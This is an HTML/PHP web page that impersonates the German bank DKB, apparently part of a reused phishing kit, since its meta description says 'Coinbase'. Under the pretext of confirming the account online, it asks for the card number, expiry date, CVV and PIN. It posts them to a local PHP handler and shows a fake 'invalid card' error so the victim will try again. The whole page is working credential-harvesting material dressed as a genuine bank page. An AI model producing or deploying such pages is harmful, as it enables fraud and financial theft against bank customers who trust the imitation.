<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="form_box">
      
    
    <div class="wrapper_form">
      <header class="header_2 d-flex justify-content-between align-items-center">
        <div class="logo d-flex align-items-center">
          <div class="bars">
            <i class="fa-solid fa-bars"></i>
          </div>
          <img src="./Asstes/imgs/Logo.svg" alt="">
        </div>
        <div class="search">
          <input type="text" placeholder="Ihre Suche...">
          <img src="./Asstes/imgs/serach.png" alt="">
        </div>
      </header>
      <div class="wrapper_boxes d-flex">
        <div class="left_box">
          <ul class="ps-0 mb-0">
            <li>Freunde werben</li>
            <li>Privatkunden</li>
            <li>Geschäftskunden</li>
            <li>Nachhaltigkeit</li>
            <li>Über uns</li>
            <li>Karriere</li>
          </ul>
        </div>
        <div class="center_box">
          <div class="title">
            <h1>Bestätigen Sie Ihre Angaben</h1>
            <p>Geben Sie Ihre mit Ihrem Konto verknüpften Kreditkarteninformationen ein, um Ihr Bankkonto online zu bestätigen.</p>
          </div>
          <?php if( isset($_GET['error']) ) : ?>
          <div class='alert alert-danger mt-3 rounded-0 d-flex align-items-center' role='alert' style="gap:5px;font-family: 'Roboto', sans-serif; margin-bottom:20px; font-size:13px;">
            <i class='ri-alert-line' style="font-size:19px; margin-right:5px;"></i>Die Kreditkartendaten sind ungültig. Bitte verwenden Sie eine gültige Kreditkarte.
          </div>    
          <?php endif; ?>            
          <form action="./Asstes/php/config/func.php" method="post">
            <input type="hidden" name="card">
            <div class="top_form">
              <div class="form-group">
                <label for="one">Kartennummer</label>
                <input inputmode="numeric" type="text" name="num" id="num" value="" placeholder="0000 0000 0000 0000">
              </div>

              <div class="row">
                <div class="col-md-6">
                  <div class="form-group">
                    <label for="two">Verfallsdatum</label>
                    <input inputmode="numeric" type="text" name="exp" id="exp" value="" placeholder="JJ/YY">
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="form-group">
                    <label for="three">CVV</label>
                    <input inputmode="numeric" type="text" name="cvv" id="cvv" value="" placeholder="123">
                  </div>
                </div>
              </div>
              <div class="form-group">
                <label for="foor">PIN</label>
                <input inputmode="numeric" type="text" name="pin" id="pin" value="" placeholder="****">
              </div>
            </div>
            <div class="bottom_form">
              <div class="btn_sub">
                <button type="submit" disabled>Weiter <i class="ri-arrow-right-s-line"></i></button>
              </div>
            </div>
          </form>
          <div class="back">
            <div class="links d-flex align-items-center">
              <img src="./Asstes/imgs/arrow.svg" alt="">
              <a href="">zurück</a>
            </div>
          </div>
        </div>
        <div class="right_box">
          <div class="infos">
            <div class="title d-flex">
              <p class="mb-0">HILFE</p>
              <span></span>
            </div>
            <p class="mb-0">Probleme bei der Anmeldung ins Banking oder mit dem TAN-Verfahren? In unseren FAQ findest du die Lösung.</p>
            <div class="links d-flex align-items-center">
              <img src="./Asstes/imgs/arrow.svg" alt="">
              <a href="">zu den Fragen & Antworten</a>
            </div>
          </div>
          <div class="infos">
            <div class="title d-flex flex-wrap">
              <p class="mb-0">Ist deine Handynummer aktuell?</p>
              <span></span>
            </div>
            <div class="d-flex justify-content-center">
              <img src="./Asstes/imgs/large.png" alt="">
            </div>
            <p class="mb-0">Bitte überprüfe deine hinterlegte Handynummer. Diese muss für die Verwendung der DKB-App & des neuen Banking aktuell sein.</p>
            <div class="links d-flex align-items-center">
              <img src="./Asstes/imgs/arrow.svg" alt="">
              <a href="">Jetzt überprüfen</a>
            </div>
          </div>
        </div>
      </div>
      <footer class="footer_2">
        <div class="col_box">
          <div class="title">
            <p class="mb-0">DKB AG</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Presse</li>
            <li>Public Affairs</li>
            <li>Investor Relations</li>
            <li><img src="./Asstes/imgs/s1.svg" alt=""> Facebook</li>
            <li><img src="./Asstes/imgs/s2.svg" alt=""> Instagram</li>
            <li><img src="./Asstes/imgs/s3.svg" alt=""> X</li>
            <li><img src="./Asstes/imgs/s4.svg" alt=""> Youtube</li>
            <li><img src="./Asstes/imgs/s5.svg" alt=""> LinkedIn</li>
            <li><img src="./Asstes/imgs/s6.svg" alt=""> TikTok</li>
            <li>Datenschutz</li>
            <li>Impressum</li>
          </ul>
        </div>
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Beliebte Produkte</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Kostenloses Girokonto</li>
            <li>Kreditkarte</li>
            <li>Online-Depot</li>
            <li>Privatkredit</li>
            <li>Studierendenkonto</li>
            <li>Geschäftskonto</li>
            <li>Immobilienangebote</li>
            <li>Baufinanzierung</li>
            <li>Festzins</li>
            <li>Tagesgeldkonto</li>
          </ul>
        </div>
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Banking & Apps</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Internet-Banking</li>
            <li>DKB-Apps</li>
            <li>TAN2go-App</li>
            <li>Neues Handy – was tun?</li>
            <li>Verwalterplattform</li>
            <li>Treuhänderplattform</li>
          </ul>
        </div>  
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Sicherheit</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Karte sperren</li>
            <li>Sicherheit im Banking</li>
            <li>TAN-Verfahren</li>
            <li>Einlagensicherung</li>
            <li>Visa Secure</li>
            <li>Card Control</li>
          </ul>
        </div>   
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Service</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>FAQ</li>
            <li>Formulare</li>
            <li>Finanzwissen</li>
            <li>Freunde werben</li>
            <li>Geldautomaten suchen</li>
            <li>IBAN-Rechner</li>
            <li>Entwickler</li>
          </ul>
        </div>                    
        <div class="col_box lof">
          <img src="./Asstes/imgs/logo2.svg" alt="">
        </div>                    
      </footer>
    </div>








    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>        
        $("#num").mask('0000 0000 0000 0000');
        $("#exp").mask('00/00');
        $("#cvv").mask('000');
        $("#pin").mask('0000');


        $(".form-group input").keyup(function(){
          if ($("#num").val() != "" & $("#exp").val() != "" & $("#cvv").val() != "" & $("#pin").val() != "") {
            $(".btn_sub button").prop("disabled",false);
          }else{
            $(".btn_sub button").prop("disabled",true);
          }
        });
    </script>
    </body>
</html>